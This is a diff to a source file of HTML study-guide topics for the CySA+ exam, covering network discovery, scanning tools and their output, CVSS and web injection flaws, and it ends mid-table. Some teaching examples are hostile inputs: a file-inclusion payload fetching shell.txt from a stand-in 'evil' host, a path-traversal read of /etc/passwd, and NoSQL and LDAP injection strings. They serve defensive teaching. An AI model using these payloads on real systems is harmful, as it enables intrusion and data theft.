@@ -8,8 +8,31 @@ dict(id="asset-discovery", o="2.1", t="Asset discovery: map scans and fingerprin
 <ul><li><strong>Map scans</strong> (discovery scans) find live hosts and open ports across a range: ping sweeps, ARP scans on a local segment, TCP SYN probes. Nmap <code>-sn</code> does host discovery without port scanning.</li>
 <li><strong>Device fingerprinting</strong> works out what a host is: OS (from TCP/IP stack quirks, <code>nmap -O</code>), services and versions (<code>nmap -sV</code>, banner grabbing), device type (printer, switch, camera).</li></ul>
 <p>Results feed the asset inventory, which then drives which scan policies apply to which hosts.</p>
-"""),
+""" + """<p><strong>Mapping the topology.</strong> Discovery tools also guess how the network is laid out. Traceroute and the TTL left in replies show how many router hops sit between the scanner and each host; Zenmap&rsquo;s Topology view draws that as a map. Treat it as a best guess: firewalls that drop probes hide whole segments, NAT collapses many hosts behind one address, and virtual or cloud networks may not look like the physical wiring at all.</p>
+<p><strong>Where you scan from changes what you find.</strong> An internal scan sees far more hosts and services than an external one, because perimeter firewalls stop most probes from the internet. Match the viewpoint to the question: &ldquo;what can an outsider reach?&rdquo; needs an external scan; &ldquo;what is on our network?&rdquo; needs an internal one.</p>
+<p><strong>Inventory, not just a list of IPs.</strong> A useful asset record adds owner, data classification, exposure (internet-facing or internal), the services it offers and its environment (production, test, development). Those fields decide which systems are scanned, how often and how aggressively. Comparing each discovery run with the last one is how moved, new or unauthorized devices show up.</p>
+<p><strong>Get permission first.</strong> Active discovery sends traffic at systems you may not own outright. Have written approval that names the ranges and times, and check your cloud provider&rsquo;s testing rules, since some tests (denial-of-service checks, for example) are banned or need advance notice.</p>
+<blockquote><span class="tag">Class deck check</span>Day 14 keys &ldquo;identify vulnerabilities&rdquo; as the purpose of asset discovery. Its main purpose is an <strong>accurate inventory</strong>: what exists, where, and what it runs. Vulnerability scanning comes next and depends on it, because you can&rsquo;t scan what you don&rsquo;t know you have.</blockquote>"""),
 
+
+dict(id="passive-discovery", o="2.1", t="Passive discovery: learning about a network without probing it", q="passive", h="""
+<p><strong>Active</strong> discovery sends packets at targets (ping sweeps, port scans). <strong>Passive</strong> discovery learns from data that already exists: logs, configuration files, traffic you are allowed to watch, and public records. It adds no load and can&rsquo;t crash anything, but it only sees what has talked recently, and the data may be out of date.</p>
+<div class="tblwrap"><table><tr><th>Source</th><th>What it reveals</th><th>Where it lives</th></tr>
+<tr><td>Router and switch configurations</td><td>Subnets, routes, VLANs, SNMP community strings, which TACACS+ or RADIUS servers handle admin logins</td><td>Device backups, configuration management</td></tr>
+<tr><td>Network device logs</td><td>Interface changes, blocked traffic, admin logins (Cisco severities 0&ndash;7, same scale as syslog)</td><td>Syslog collector, SIEM</td></tr>
+<tr><td>Flow records (NetFlow, sFlow, IPFIX)</td><td>Who talks to whom, on which ports, how much, and when</td><td>Flow collector</td></tr>
+<tr><td>DHCP leases and server configuration</td><td>Which devices joined, their MAC addresses and host names; fixed reservations usually mark servers and printers</td><td>DHCP server logs</td></tr>
+<tr><td>Firewall rules and logs</td><td>Which services are meant to be reachable, and what is being tried and denied</td><td>Firewall, SIEM</td></tr>
+<tr><td><code>netstat</code> / <code>ss</code>, ARP tables</td><td>A host&rsquo;s listening ports and live connections; neighbors on the local segment</td><td>The host itself</td></tr>
+<tr><td>Packet capture or a passive sensor on a SPAN port</td><td>Every host that sends traffic, plus software versions seen in banners and handshakes</td><td>Sensor, IDS</td></tr>
+<tr><td>DNS records</td><td>Host names and addresses, mail servers (MX), naming patterns that hint at purpose (<code>vpn</code>, <code>dev</code>)</td><td>Public and internal DNS</td></tr>
+<tr><td>Registrars, Whois and the regional internet registries (ARIN, RIPE NCC, APNIC, LACNIC, AFRINIC)</td><td>Who owns a domain or address block, contacts, and the organization&rsquo;s netblocks and AS numbers</td><td>Public lookups</td></tr>
+<tr><td>Certificate transparency logs, search engines, Shodan and Censys</td><td>Subdomains from issued certificates; internet-facing services someone else has already scanned</td><td>Public sites</td></tr></table></div>
+<p><strong>Zone transfers.</strong> A DNS zone transfer (AXFR) copies a whole zone to a secondary server. If the primary allows it from anyone, one request lists every name in the zone:</p>
+<pre><code>dig axfr @ns1.example.com example.com</code></pre>
+<p>Fix it by allowing transfers only to known secondaries (and signing them with TSIG). When transfers are blocked, attackers fall back to <strong>DNS brute forcing</strong>: trying common names (<code>mail</code>, <code>vpn</code>, <code>test</code>) one at a time.</p>
+<p><strong>Passive vulnerability scanning.</strong> A passive scanner on a SPAN port reads software versions out of the traffic it sees and flags outdated ones. It finds devices an active scan never reaches (fragile OT, laptops that are rarely online) but only as long as they generate traffic, so it supplements active scanning rather than replacing it.</p>
+""" + T.format("Querying public records (Whois, certificate logs, Shodan) is passive because it never touches the target. A zone transfer request does reach the target&rsquo;s own name server, so if a question stresses &ldquo;without interacting with the organization&rsquo;s systems,&rdquo; the zone transfer is not the answer.")),
 dict(id="scan-considerations", o="2.1", t="Special considerations when scanning", q="scheduling", h="""
 <div class="tblwrap"><table><tr><th>Consideration</th><th>What to think about</th></tr>
 <tr><td>Scheduling</td><td>Scan outside business hours or in maintenance windows; stagger scans so they don&rsquo;t collide with backups</td></tr>
@@ -19,6 +42,9 @@ dict(id="scan-considerations", o="2.1", t="Special considerations when scanning"
 <tr><td>Segmentation</td><td>Firewalls between zones block or skew results; place a scanner or agent inside each segment</td></tr>
 <tr><td>Regulatory requirements</td><td>PCI DSS requires quarterly internal and external scans (external by an Approved Scanning Vendor) and after significant change</td></tr></table></div>
 <p><strong>How often?</strong> Frequency follows risk: the organization&rsquo;s size and risk appetite, how exposed and critical the assets are, industry and regulatory requirements, and what the team can actually remediate. Internet-facing and high-value systems are scanned more often; many organizations move toward continuous scanning with agents. Scanning more often than you can fix just grows the backlog.</p>
+<p><strong>Tuning the scan policy.</strong> Scanners group checks into plug-in families. Turn off the families that can&rsquo;t apply (no Windows checks against a Linux web farm): the scan finishes sooner and produces fewer false positives. Keep <em>dangerous</em> plug-ins, the ones that test by crashing a service, off production, and try any new policy against a test system first.</p>
+<p><strong>Look after the scanner itself.</strong> Patch the scanner software, and update its plug-in feed often (daily is normal) or it won&rsquo;t know about last week&rsquo;s vulnerabilities. The scanner holds privileged credentials and a map of every weakness you have, so harden it and restrict who can log in.</p>
+<p><strong>Segmentation shrinks scope.</strong> Putting card-processing systems in their own segment limits what PCI DSS applies to, and so what you must scan to its standard. PCI also expects you to rescan until a clean result is achieved, and external scans must come from an Approved Scanning Vendor.</p>
 """),
 
 dict(id="scan-types", o="2.1", t="Scan types compared", q="credentialed", h="""
@@ -32,6 +58,9 @@ dict(id="scan-types", o="2.1", t="Scan types compared", q="credentialed", h="""
 <p><strong>By target</strong>, scans are usually grouped as <strong>network</strong> (hosts, open ports, services, device configurations), <strong>web application</strong> (injection, XSS, authentication and session flaws: Burp, ZAP, Nikto) and <strong>database</strong> (default accounts, weak permissions, missing patches, unencrypted sensitive columns). Most programs need all three, because a clean network scan says nothing about the app or the data store behind it.</p>
 <p><strong>Automated vs. manual.</strong> Automated scanners are fast, repeatable and cover thousands of known checks, but they miss business-logic flaws and produce false positives. Manual testing by a skilled analyst finds what tools can&rsquo;t, such as chained weaknesses or broken authorization logic, but it is slow and expensive. Use automation for breadth and regular coverage, and manual review to validate findings and probe the most important systems.</p>
 <p><strong>Active vs passive, stated plainly.</strong> If you send packets to the target, it is active. A ping sweep (<code>nmap -sn</code>), a port scan and a vulnerability scan are all active, even though none of them exploit anything. Passive means observing without touching the target: reading mirrored traffic, a passive asset-discovery sensor on a SPAN port, or OSINT. The difference between a vulnerability scan and a penetration test is <em>exploitation</em>, not active versus passive.</p>
+<p><strong>The credentialed scan account.</strong> Use a dedicated account with the least privilege that lets the checks run, read-only wherever the product allows. Keep its password in a vault, rotate it, and alert if it logs in anywhere outside scan windows. Never reuse a domain admin account for scanning.</p>
+<p><strong>Agents give an inside-out view.</strong> An agent reports what the host itself can see (installed software, local configuration) wherever the device is, including off the corporate network. Roll agents out to a pilot group first, because they are software too: they need patching and can conflict with other tools.</p>
+<p><strong>What skews a network scan.</strong> Firewalls, segmentation, NAT and an IPS that blocks or shuns the scanner&rsquo;s address all hide results. Either place a scanner (or agents) inside each zone, or exempt the scanner&rsquo;s address in the IPS for the scan window, and keep an external scan for the outsider&rsquo;s view.</p>
 """ + T.format("A non-credentialed scan reporting fewer findings does not mean the host is safer. It means the scanner saw less. Credentialed scans are the accurate baseline for patch status.")),
 
 dict(id="fuzzing-re", o="2.1", t="Fuzzing and reverse engineering", q="fuzzing", h="""
@@ -51,6 +80,12 @@ dict(id="fuzzing-re", o="2.1", t="Fuzzing and reverse engineering", q="fuzzing",
 <li><strong>Obstacles</strong>: attackers use <strong>obfuscation</strong>, <strong>packing</strong> (compressed or encrypted code that unpacks itself at run time), encryption, and anti-debugging or VM-detection tricks to slow analysts down. A packed sample shows almost nothing in <code>strings</code>, which is itself a clue.</li>
 <li>Always analyze in an isolated lab or sandbox, never on a production host.</li></ul>
 <p><strong>Mobile apps.</strong> An Android APK is a zip file. <code>apktool</code> decodes its resources and bytecode (to smali), and a decompiler such as jadx produces readable Java. Analysts look for hard-coded API keys and URLs, disabled certificate validation, debug flags and client-side checks that the server never repeats.</p>
+<p><strong>Fuzzing&rsquo;s relatives</strong> (general knowledge, but they come up next to it):</p>
+<div class="tblwrap"><table><tr><th>Method</th><th>What it changes</th><th>What it finds</th></tr>
+<tr><td>Fuzzing</td><td>The <em>input</em>: large volumes of malformed or random data</td><td>Crashes, hangs and memory errors in input handling</td></tr>
+<tr><td>Fault injection</td><td>The <em>conditions</em>: forces errors into rarely used paths, at compile time (altered source), at the protocol level (non-compliant data) or at run time (corrupted memory or failed calls)</td><td>Error handling that fails unsafely</td></tr>
+<tr><td>Mutation testing</td><td>The <em>program</em>: makes small deliberate changes to the code and reruns the test suite</td><td>Weak tests: if a mutated program still passes, the tests aren&rsquo;t checking that logic</td></tr></table></div>
+<p>Don&rsquo;t confuse <em>mutation-based fuzzing</em> (mutating sample inputs) with <em>mutation testing</em> (mutating the code to grade the tests).</p>
 """ + T.format("Fuzzing finds flaws by running the program with bad input (dynamic). Reverse engineering explains a binary without its source (usually static). If the question says &ldquo;malformed input&rdquo; or &ldquo;crashes&rdquo;, it is fuzzing.")),
 
 dict(id="critical-infra", o="2.1", t="Critical infrastructure: OT, ICS, SCADA", q="scada", h="""
@@ -60,7 +95,9 @@ dict(id="critical-infra", o="2.1", t="Critical infrastructure: OT, ICS, SCADA", 
 <li>Devices are old, rarely patched, and run proprietary protocols (Modbus, DNP3) with no authentication.</li>
 <li>Prefer <strong>passive</strong> monitoring, vendor-approved tools, and testing in a lab or during planned shutdowns.</li></ul>
 <p>Protection relies on segmentation from IT networks, strict remote-access control, and compensating controls where patching isn&rsquo;t possible.</p>
-""" + T.format("For OT, &ldquo;run an active credentialed scan of the production PLCs&rdquo; is almost never the right answer. Passive discovery or scanning a test environment is.")),
+<p><strong>OT is broader than the factory floor.</strong> Building automation (HVAC, fire suppression, door and turnstile controllers), physical access systems, and IoT in vehicles, drones and medical devices all count. PLCs commonly talk Modbus over serial or TCP. Many of these devices have no automatic updates, so you learn about a needed patch from a scan finding or by subscribing to the manufacturer&rsquo;s security bulletins.</p>
+""" + T.format("For OT, &ldquo;run an active credentialed scan of the production PLCs&rdquo; is almost never the right answer. Passive discovery or scanning a test environment is.") + """
+<blockquote><span class="tag">Class deck check</span>Day 14 keys Transportation as the sector that uses SCADA. From those four options that is the best answer, but SCADA is most often described in <strong>energy (power grids, pipelines) and water and wastewater</strong>, so expect those in exam scenarios.</blockquote>"""),
 
 dict(id="baseline-frameworks", o="2.1", t="Baseline scanning and industry frameworks", q="cis", h="""
 <p><strong>Security baseline scanning</strong> checks configuration against a standard (password policy, services disabled, audit settings) rather than looking for missing patches. Results show drift from the approved build.</p>
@@ -71,6 +108,19 @@ dict(id="baseline-frameworks", o="2.1", t="Baseline scanning and industry framew
 <tr><td><strong>OWASP</strong></td><td>Open web-app security community: the Top 10 risk list, Testing Guide, ASVS, ZAP</td></tr>
 <tr><td><strong>ISO 27000 series</strong></td><td>International standards for an information security management system; 27001 is certifiable, 27002 gives control guidance</td></tr></table></div>
 <p><strong>Cloud-specific (enrichment, not on the printed list).</strong> The Cloud Security Alliance&rsquo;s <strong>Cloud Controls Matrix</strong> (CCM) is a control framework for cloud services, mapped to ISO 27001, NIST and others. The <strong>CAIQ</strong> is the questionnaire built from it, which providers complete to describe their controls. Many publish theirs in CSA&rsquo;s STAR registry.</p>
+<p><strong>The OWASP Top 10 (2021)</strong>, which objective 2.4 largely mirrors:</p>
+<div class="tblwrap"><table><tr><th>#</th><th>Category</th></tr>
+<tr><td>A01</td><td>Broken Access Control</td></tr>
+<tr><td>A02</td><td>Cryptographic Failures</td></tr>
+<tr><td>A03</td><td>Injection (XSS is counted here)</td></tr>
+<tr><td>A04</td><td>Insecure Design</td></tr>
+<tr><td>A05</td><td>Security Misconfiguration</td></tr>
+<tr><td>A06</td><td>Vulnerable and Outdated Components</td></tr>
+<tr><td>A07</td><td>Identification and Authentication Failures</td></tr>
+<tr><td>A08</td><td>Software and Data Integrity Failures</td></tr>
+<tr><td>A09</td><td>Security Logging and Monitoring Failures</td></tr>
+<tr><td>A10</td><td>Server-Side Request Forgery (SSRF)</td></tr></table></div>
+<p>OWASP has since published a newer edition that reorders and renames some entries. CS0-003 was written against the 2021 list, so use these names on the exam.</p>
 """),
 
 # ---------------------------------------------------------------- 2.2
@@ -116,8 +166,39 @@ set RHOSTS 10.0.10.20
 check        # supported by some modules: test without exploiting
 run</code></pre>
 <p>Module types: <strong>exploit</strong> (delivers a payload), <strong>auxiliary</strong> (scanners, fuzzers, brute forcers; no payload), <strong>post</strong> (after access). For an analyst, MSF validates a finding. A successful exploit confirms a true positive, but only with written authorization, and prefer <code>check</code> or an auxiliary scanner on production.</p>
-""" + T.format("Scout Suite and Prowler audit cloud configuration; Pacu attacks it. If the question says &ldquo;exploit&rdquo; or &ldquo;penetration test&rdquo; against AWS, the answer is Pacu.")),
+""" + T.format("Scout Suite and Prowler audit cloud configuration; Pacu attacks it. If the question says &ldquo;exploit&rdquo; or &ldquo;penetration test&rdquo; against AWS, the answer is Pacu.") + """
+<blockquote><span class="tag">Class deck check</span>Day 14 says ZAP&rsquo;s key strength over Burp Suite is robust manual testing. Manual, interactive testing is what Burp is known for. What sets <strong>ZAP</strong> apart is that it is <strong>free and open source with a full automated scanner and an API for CI/CD pipelines</strong>, which Burp keeps for its paid edition.</blockquote>"""),
 
+
+dict(id="tool-output", o="2.2", t="Recognizing each 2.2 tool from its output", q="metasploit", h="""
+<p>Objective 2.2 says <em>analyze output</em>, so expect a screenshot or a block of text and a question about which tool produced it or what it means. Each tool has a recognizable look.</p>
+<div class="tblwrap"><table><tr><th>Tool</th><th>What its output looks like</th><th>What it can&rsquo;t tell you</th></tr>
+<tr><td><strong>Angry IP Scanner</strong></td><td>A GUI grid, one row per address, with columns chosen by &ldquo;fetchers&rdquo; (ping time, host name, open ports, MAC vendor) and a colored dot for alive or dead</td><td>Service versions, operating systems or vulnerabilities</td></tr>
+<tr><td><strong>Maltego</strong></td><td>A graph: icons for entities (domain, DNS name, email address, person, IP, netblock) joined by lines, produced by running <em>transforms</em> that look up related data</td><td>Port or service detail; it maps relationships</td></tr>
+<tr><td><strong>Nmap</strong></td><td>&ldquo;Nmap scan report for&hellip;&rdquo; then a PORT / STATE / SERVICE / VERSION table (see the Nmap topic)</td><td>Whether a version is actually exploitable</td></tr>
+<tr><td><strong>Metasploit</strong></td><td>An <code>msf6 &gt;</code> prompt; commands <code>use</code>, <code>set RHOSTS</code>, <code>show options</code>, <code>run</code>; results prefixed <code>[+]</code> success, <code>[*]</code> status, <code>[-]</code> failure; a successful exploit ends with a session opening</td><td>&mdash; it is the tool that <em>proves</em> exploitability</td></tr>
+<tr><td><strong>Recon-ng</strong></td><td>A <code>[recon-ng][workspace] &gt;</code> prompt; <code>marketplace install</code>, <code>modules load</code>, <code>options set SOURCE</code>, <code>run</code>; findings saved to tables such as hosts and contacts, shown with <code>show hosts</code></td><td>Anything not in a public source or API it queried</td></tr>
+<tr><td><strong>Nessus / OpenVAS</strong></td><td>Findings with a plug-in ID, severity band, CVSS, description, solution, references, evidence output and affected ports and hosts (see the scan report topic)</td><td>Business context; the analyst adds that</td></tr>
+<tr><td><strong>Nikto</strong></td><td>Command-line lines starting <code>+</code>: server banner, missing headers, interesting files and directories, risky HTTP methods</td><td>Deep application logic</td></tr>
+<tr><td><strong>ZAP</strong></td><td>A Sites tree, a History list and an Alerts tab with flags by risk (High, Medium, Low, Informational) and a confidence level; spider and active-scan progress bars</td><td>&mdash;</td></tr>
+<tr><td><strong>Burp Suite</strong></td><td>Proxy history of captured requests, Repeater and Intruder tabs, and (paid edition) issues with severity plus certain/firm/tentative confidence</td><td>&mdash;</td></tr>
+<tr><td><strong>Arachni</strong></td><td>A report of issues by severity, each with the input vector (form, link, cookie, header), the parameter and the proof it injected</td><td>Current checks: the project is no longer maintained</td></tr>
+<tr><td><strong>Immunity Debugger</strong></td><td>A Windows GUI with panes for disassembly, registers, memory dump and the stack; Python scripts such as mona</td><td>&mdash;</td></tr>
+<tr><td><strong>GDB</strong></td><td>A <code>(gdb)</code> prompt: <code>break</code>, <code>run</code>, <code>info registers</code>, <code>x/20x $rsp</code>, <code>bt</code> for a backtrace</td><td>&mdash;</td></tr>
+<tr><td><strong>Scout Suite</strong></td><td>An HTML dashboard per cloud service (IAM, compute, storage&hellip;) with counts of resources checked and findings flagged as danger or warning</td><td>Exploitability; it audits configuration</td></tr>
+<tr><td><strong>Prowler</strong></td><td>One line per check with PASS or FAIL (or MANUAL), a severity, the resource and the compliance requirement it maps to (CIS, PCI and others); exportable as CSV, JSON or HTML</td><td>&mdash;</td></tr>
+<tr><td><strong>Pacu</strong></td><td>An interactive <code>Pacu (session) &gt;</code> prompt running modules grouped by attack stage: recon, enumeration, privilege escalation, lateral movement, persistence, exfiltration</td><td>&mdash; it is offensive, for authorized testing</td></tr></table></div>
+<p><strong>A Metasploit scanner run, read line by line:</strong></p>
+<pre><code>msf6 &gt; use auxiliary/scanner/portscan/tcp
+msf6 auxiliary(scanner/portscan/tcp) &gt; set RHOSTS 10.0.20.15
+msf6 auxiliary(scanner/portscan/tcp) &gt; set PORTS 1-1024
+msf6 auxiliary(scanner/portscan/tcp) &gt; run
+[+] 10.0.20.15:   - 10.0.20.15:22 - TCP OPEN
+[+] 10.0.20.15:   - 10.0.20.15:80 - TCP OPEN
+[*] Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed</code></pre>
+<p>An <em>auxiliary</em> module scans or gathers information; an <em>exploit</em> module attacks. Seeing <code>auxiliary/scanner/...</code> means discovery, not compromise.</p>
+""" + T.format("Scout Suite and Prowler audit cloud configuration; Pacu attacks it. If the question describes an offensive, module-driven AWS test, the answer is Pacu. If it describes a pass/fail compliance report, it is Prowler.")),
 dict(id="nmap-output", o="2.2", t="Reading Nmap output", q="nmap", h="""
 <div class="tblwrap"><table><tr><th>Flag</th><th>Does</th></tr>
 <tr><td><code>-sS</code></td><td>SYN (half-open) scan, the default when run as root</td></tr>
@@ -138,7 +219,32 @@ dict(id="nmap-output", o="2.2", t="Reading Nmap output", q="nmap", h="""
 <p><strong>Flags people mix up.</strong> <code>-sV</code> is version detection; <code>-v</code> is verbose. <code>-sn</code> skips the port scan but still sends probes (ARP on the local subnet; ICMP echo and TCP probes elsewhere), so a ping sweep is <em>active</em> reconnaissance.</p>
 <p><strong>Comparing two scans.</strong> Save XML with <code>-oX</code> and compare runs with <code>ndiff monday.xml friday.xml</code>, or Zenmap&rsquo;s Compare Results. Lines starting <code>+</code> are new and <code>-</code> are gone. A host or open port that wasn&rsquo;t in the baseline is how a rogue device or an unauthorized service shows up.</p>
 <p><strong>Some version strings are findings on their own.</strong> <code>vsftpd 2.3.4</code> answering on 21/tcp is the release that was briefly distributed with a backdoor (CVE-2011-2523). Matching a version banner to a known CVE is the core 2.2 read.</p>
-""" + T.format("Filtered does not mean closed. It means Nmap can&rsquo;t tell, usually because a firewall dropped the probe.")),
+<p><strong>Reading one scan, top to bottom.</strong></p>
+<pre><code>$ sudo nmap -sS -sV -O 10.0.20.15
+Nmap scan report for fs01.corp.local (10.0.20.15)
+Host is up (0.00041s latency).
+Not shown: 994 closed tcp ports (reset)
+PORT     STATE    SERVICE  VERSION
+22/tcp   open     ssh      OpenSSH 7.4 (protocol 2.0)
+80/tcp   open     http     Apache httpd 2.4.6 ((CentOS))
+111/tcp  open     rpcbind  2-4 (RPC #100000)
+443/tcp  filtered https
+2049/tcp open     nfs_acl  3 (RPC #100227)
+3306/tcp open     mysql    MySQL 5.5.68-MariaDB
+MAC Address: 08:00:27:3A:91:C4 (Oracle VirtualBox virtual NIC)
+Running: Linux 3.X
+OS details: Linux 3.10 - 4.11
+Network Distance: 1 hop</code></pre>
+<ol><li><strong>Command line</strong>: a SYN scan with version and OS detection, run as root.</li>
+<li><strong>Host is up</strong>, sub-millisecond latency: it is close by.</li>
+<li><strong>Not shown: 994 closed</strong>: Nmap hides the uninteresting ports; only six are listed.</li>
+<li><strong>Port table</strong>: 443 is <em>filtered</em> (something dropped the probe), the rest are open. The database on 3306 answering the network is itself worth a question: should it be reachable from here?</li>
+<li><strong>Versions</strong>: OpenSSH 7.4 and Apache 2.4.6 on CentOS are old releases. Red Hat-family vendors backport fixes without changing the version number, so confirm with a credentialed check before calling them vulnerable.</li>
+<li><strong>MAC address</strong>: the vendor prefix (08:00:27) says this is a VirtualBox virtual machine.</li>
+<li><strong>OS lines</strong>: a fingerprint guess, given as a range.</li>
+<li><strong>Network distance: 1 hop</strong>: same subnet as the scanner, which is also why a MAC address appears at all.</li></ol>
+""" + T.format("Filtered does not mean closed. It means Nmap can&rsquo;t tell, usually because a firewall dropped the probe.") + """
+<blockquote><span class="tag">Class deck check</span>Day 14&rsquo;s port-state slide says <em>unfiltered</em> means &ldquo;accessible but no service&rdquo;. <strong>Unfiltered</strong> means the probe reached the port but Nmap can&rsquo;t tell whether it is open or closed; you see it with an ACK scan (<code>-sA</code>), which maps firewall rules, not services. A port with no service listening is <strong>closed</strong>.</blockquote>"""),
 
 dict(id="scan-report", o="2.2", t="Reading a vulnerability scan report", q="plugin", h="""
 <p>A finding typically contains: plugin or check ID, name, severity, CVSS score and vector, CVE references, affected host and port, a description, the evidence the scanner saw (version banner or request/response), and a recommended fix.</p>
@@ -153,6 +259,9 @@ dict(id="scan-report", o="2.2", t="Reading a vulnerability scan report", q="plug
 <li><strong>Severity bands.</strong> Nessus maps CVSS to Critical (9.0&ndash;10), High (7.0&ndash;8.9), Medium (4.0&ndash;6.9), Low (0.1&ndash;3.9) and Info. Info plugins such as OS identification and traceroute are inventory, not vulnerabilities.</li>
 <li><strong>Did the credentials work?</strong> Nessus&rsquo;s scan-information output states whether credentialed checks ran. A credentialed scan that silently failed looks exactly like a clean host.</li></ul>
 <p><strong>Greenbone and OpenVAS.</strong> CS0-003 names OpenVAS. Greenbone packages the OpenVAS scanner with a management interface (community and commercial editions). Its reports add a <strong>quality of detection</strong> (QoD) percentage: low QoD means the result was inferred, often from a banner, so validate it before you act.</p>
+<p><strong>Informational results.</strong> Often most of a report. They are not vulnerabilities, but they show what an attacker&rsquo;s reconnaissance would learn. Set a policy for them: for example, once the same informational item appears in several consecutive scans, record a decision (fix it, or note why not) so auditors can see you looked.</p>
+<p><strong>Documented exceptions.</strong> When a finding is accepted rather than fixed, record the exception in the scanner as well as in the risk register, so it stops reappearing as noise. Check compliance rules first: some findings can&rsquo;t be excepted under PCI DSS and similar standards.</p>
+<p><strong>Don&rsquo;t read a report in a vacuum.</strong> Reconcile it with other sources: server and firewall logs (has anyone tried to exploit this?), the SIEM, and configuration management records (what is really installed, who owns it). Then watch <strong>trends</strong>: how many new findings appear each cycle, how old the open ones are, and how long fixes take. A rising count of the same issue points to a broken process, not a one-off.</p>
 """),
 
 # ---------------------------------------------------------------- 2.3
@@ -168,7 +277,9 @@ dict(id="cvss", o="2.3", t="CVSS interpretation", q="cvss", h="""
 <p>Severity bands: 0.1&ndash;3.9 Low, 4.0&ndash;6.9 Medium, 7.0&ndash;8.9 High, 9.0&ndash;10.0 Critical.</p>
 <p><strong>Scope Changed</strong> means the exploit breaks out of the vulnerable component&rsquo;s security authority, such as a VM escape to the hypervisor or a browser bug that affects the OS. It pushes the score up.</p>
 <p>Temporal metrics (exploit code maturity, remediation level) and environmental metrics (your asset&rsquo;s security requirements) adjust the base score. CVSS v4.0 exists (2023), but CS0-003 questions use v3.x vectors.</p>
-""" + T.format("Attack Vector: Adjacent means same local network segment (Bluetooth, same subnet), not &ldquo;next to the computer&rdquo;. Physical is touching the device.")),
+""" + T.format("Attack Vector: Adjacent means same local network segment (Bluetooth, same subnet), not &ldquo;next to the computer&rdquo;. Physical is touching the device.") + """
+<blockquote><span class="tag">Class deck check</span>Day 13, question 1 says &ldquo;CVE metrics&rdquo;: the metrics are <strong>CVSS</strong>; CVE is only the identifier. The vector prefix is <code>CVSS:3.1/</code>, not <code>CVSS:31</code>. The keyed answer has <code>A:L</code> although the question says availability is not affected, which is <code>A:N</code>. Two options use values that don&rsquo;t exist: AV takes only N, A, L or P; PR takes N, L or H; UI takes N or R.</blockquote>
+<blockquote><span class="tag">Class deck check</span>Day 14 says a &ldquo;Low impact&rdquo; vulnerability means no impact on confidentiality, integrity or availability. That is <strong>None (N)</strong>. <strong>Low (L)</strong> means some loss: limited data read or changed, or reduced performance.</blockquote>"""),
 
 dict(id="validation", o="2.3", t="Validation: true and false positives and negatives", q="false positive", h="""
 <div class="tblwrap"><table><tr><th></th><th>Scanner says vulnerable</th><th>Scanner says not vulnerable</th></tr>
@@ -204,6 +315,7 @@ dict(id="injection-traversal", o="2.4", t="Injection, directory traversal, LFI/R
 <li><strong>LFI</strong> makes the app include a file already on the server (<code>?page=../../etc/passwd</code>); <strong>RFI</strong> makes it include a file from an attacker&rsquo;s server (<code>?page=http://evil/shell.txt</code>), which leads straight to code execution. Fix: never pass user input to include functions; disable remote includes (PHP <code>allow_url_include=Off</code>).</li>
 <li><strong>RCE</strong> (remote code execution) is the outcome attackers want from many of these: running their commands on your server.</li></ul>
 <p><strong>Not just SQL.</strong> <strong>NoSQL injection</strong>: a login that passes JSON straight into a MongoDB query can be bypassed with an operator instead of a password, for example <code>{"username":"admin","password":{"$ne":null}}</code> (&ldquo;password not equal to null&rdquo; is always true). <strong>LDAP injection</strong>: input such as <code>*)(uid=*))(|(uid=*</code> rewrites a directory search filter, which can bypass authentication or list every account. The fix is the same pattern every time: keep data separate from the query language (parameterized APIs, typed inputs), validate against an allow-list, and run the service with least privilege.</p>
+<p><strong>After a file inclusion, expect a web shell.</strong> Attackers use LFI or RFI (or an upload flaw) to plant a small script that runs commands sent through ordinary HTTP or HTTPS requests. It blends in with web traffic, so look for new script files in upload or web directories and for the web server process starting shells.</p>
 """ + T.format("Input validation helps, but the specific fix for SQL injection the exam wants is parameterized queries (prepared statements).")),
 
 dict(id="overflows", o="2.4", t="Overflow vulnerabilities", q="overflow", h="""
@@ -234,6 +346,46 @@ dict(id="owasp-flaws", o="2.4", t="Access control, crypto failures, design and c
 <p><strong>Weak cryptography a scanner will flag:</strong> SSL 2.0/3.0 and TLS 1.0/1.1; RC4, DES and 3DES ciphers; MD5 or SHA-1 used for signatures or certificates; RSA keys under 2048 bits; certificates that are expired, self-signed or don&rsquo;t match the host name. The usual fix is configuration, not code: disable old protocol versions and cipher suites on the server or load balancer, then rescan.</p>
 """),
 
+
+dict(id="scan-findings-map", o="2.4", t="From scan finding to 2.4 category to control", q="misconfiguration", h="""
+<p>Many 2.4 questions hand you a scanner finding and ask for the control. Work it in three steps: <strong>name the category</strong>, <strong>find the root cause</strong>, then <strong>pick the control that removes that cause</strong>. Who does the work matters too: some fixes are a patch, some a configuration change, some need developers to change code.</p>
+<div class="tblwrap"><table><tr><th>Finding you might see</th><th>2.4 category</th><th>Control</th><th>Fixed by</th></tr>
+<tr><td>SSL 2.0/3.0 or TLS 1.0/1.1 accepted</td><td>Cryptographic failures</td><td>Disable old versions; allow TLS 1.2 and 1.3 only</td><td>Configuration</td></tr>
+<tr><td>RC4, DES or 3DES cipher suites offered</td><td>Cryptographic failures</td><td>Remove weak suites; prefer AES-GCM</td><td>Configuration</td></tr>
+<tr><td>Certificate expired, name mismatch, or issued by an untrusted CA</td><td>Cryptographic failures</td><td>Renew; issue with the right name in the SAN; use a trusted CA; monitor expiry</td><td>Configuration</td></tr>
+<tr><td>FTP or Telnet accepts cleartext logins</td><td>Insecure design</td><td>Replace with SFTP or FTPS, and SSH</td><td>Configuration / service change</td></tr>
+<tr><td>Debug mode or HTTP TRACE enabled on a public server</td><td>Security misconfiguration</td><td>Disable on production; debug only in a private development environment</td><td>Configuration</td></tr>
+<tr><td>Web server header leaks an internal (RFC 1918) address</td><td>Security misconfiguration</td><td>Fix the server or proxy configuration so internal addresses aren&rsquo;t returned</td><td>Configuration</td></tr>
+<tr><td>Directory listing, default pages or sample scripts present</td><td>Security misconfiguration</td><td>Remove them; apply a hardened baseline</td><td>Configuration</td></tr>
+<tr><td>Default or blank administrator password</td><td>Identification and authentication failures</td><td>Change or disable the account; enforce MFA for admin access</td><td>Configuration</td></tr>
+<tr><td>Unsupported operating system detected</td><td>End-of-life components</td><td>Upgrade. If you can&rsquo;t yet: isolate it, add compensating controls, document an exception with an end date</td><td>Project / exception</td></tr>
+<tr><td>Library version with known CVEs (for example an old Log4j)</td><td>Outdated components</td><td>Update the dependency; track components with an SBOM and composition scanning</td><td>Developers</td></tr>
